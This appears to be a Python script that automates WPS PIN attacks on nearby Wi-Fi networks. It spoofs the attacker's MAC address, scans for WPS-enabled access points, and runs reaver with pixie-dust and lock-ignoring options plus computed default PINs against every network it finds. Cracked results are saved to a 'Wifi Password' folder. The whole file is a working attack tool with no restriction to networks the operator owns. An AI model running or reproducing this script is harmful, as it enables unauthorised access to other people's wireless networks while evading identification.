import os
import subprocess
import time
import shutil
import csv
import fileinput
from termcolor import colored


os.system('clear')
print("Interfaces:\nPlease pick one:\n\n")
subprocess.call("sudo airmon-ng",shell=True)
interface = input("Enter your interface name: ") 
os.system('clear')
print(colored("Masking MAC address", 'green'))
subprocess.call("sudo ifconfig "+interface+" down",shell=True)
subprocess.call("sudo macchanger -r "+interface,shell=True)
subprocess.call("sudo ifconfig "+interface+" up",shell=True)
os.system('clear')
timeout_search = input("\nSearch duration: (e.g. '50' '1m' '1d' ):  ")
timeout_attack = input("\nAttack duration: (e.g. '50' '1m' '1d' ):  ")

os.system('clear')
if "mon" in interface:
	os.system('clear')
else:
	subprocess.call("sudo airmon-ng start "+interface,shell=True)
	os.system('clear')

os.system('clear')

if os.path.isfile( os.path.dirname(__file__)+"/tempfile.txt") or os.path.islink( os.path.dirname(__file__)+"/tempfile.txt"):
 os.remove( os.path.dirname(__file__)+"/tempfile.txt") 

subprocess.call(['sudo timeout -k 5 '+timeout_search+' wash -i wlan0mon  |tee ' + os.path.dirname(__file__) + '/tempfile.txt' ],shell=True)

with open( os.path.dirname(__file__)+"/tempfile.txt", 'r') as my_file:
  reader = csv.reader(my_file, delimiter=' ')
  my_list = list(reader)
os.system('clear')


for row in range(len(my_list)):
 try:
  if row:
   if not "BSSID" in my_list[row][0]:
    if not "Station" in my_list[row][0]:
     if not "----" in my_list[row][0]:
      if not "2.0  Yes" in my_list[row][0]:
       print("Attacking: " +my_list[row][-1])
       if not os.path.isfile( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
        subprocess.call(["echo 'Y\n' | sudo timeout -k 5 "+timeout_attack+" reaver -i "+interface+"mon"+" -b "+my_list[row][0]+"-v -K -Z -L -S --no-nacks --ignore-locks -c "+my_list[row][4]+" | tee  "+ os.path.dirname(__file__)+"/Wifi Password/"+my_list[row][-1]+".txt"],shell=True)
       with open( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") as f:
        if "[+] WPS pin:" in f.read():
         print("Success")
        else:
          try:
           if os.path.isfile( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
            os.remove( os.path.dirname(__file__)+'/'+my_list[row][-1]+'.txt') 
          except:
           pass
       os.system('clear')
 except:
  pass
time.sleep(5)
for row in range(len(my_list)):
 try:
  if row:
   if not "BSSID" in my_list[row][0]:
    if not "Station" in my_list[row][0]:
     if not "----" in my_list[row][0]:
      if not "2.0  Yes" in my_list[row][0]:
       if not os.path.isfile( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
        mac_pin = os.popen('echo "'+ my_list[row][0]+'" |python3 '+os.path.dirname(__file__)+'/wpspin.py')
        print("Attacking: " +my_list[row][-1])
        mac_pin_clean=mac_pin.read().rstrip("\n")
        subprocess.call(["echo 'Y\n' | sudo timeout -k 5 10m reaver -i "+interface+"mon"+" -b "+my_list[row][0]+" -p "+mac_pin_clean+" -v -K -Z -L -S --no-nacks --ignore-locks -c "+my_list[row][4]+" | tee  "+ os.path.dirname(__file__)+"/Wifi Password/"+my_list[row][-1]+".txt"],shell=True)
       with open( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") as f:
        if "[+] WPS pin:" in f.read():
         pass
        else:
          try:
           if os.path.isfile( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
            os.remove( os.path.dirname(__file__)+'/'+my_list[row][-1]+'.txt') 
          except:
           pass
       os.system('clear')
 except:
  pass




os.system('clear')
print("\n\tSummary:")
for row in range(len(my_list)):
 try:
  if row:
   if not "BSSID" in my_list[row][0]:
    if not "Station" in my_list[row][0]:
     if not "----" in my_list[row][0]:
      if os.path.isfile(os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink(os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
       print(my_list[row][-1]+colored(" Success", 'green'))
      else:
       print(my_list[row][-1]+colored(" Failed", 'red'))

 except:
  pass
try:
 if os.path.isfile( os.path.dirname(__file__)+"/"+"tempfile.txt") or os.path.islink( os.path.dirname(__file__)+"/"+"tempfile.txt"):
  os.remove( os.path.dirname(__file__)+"/"+'tempfile.txt') 
except:
 pass
subprocess.call("sudo airmon-ng stop "+interface+"mon",shell=True)

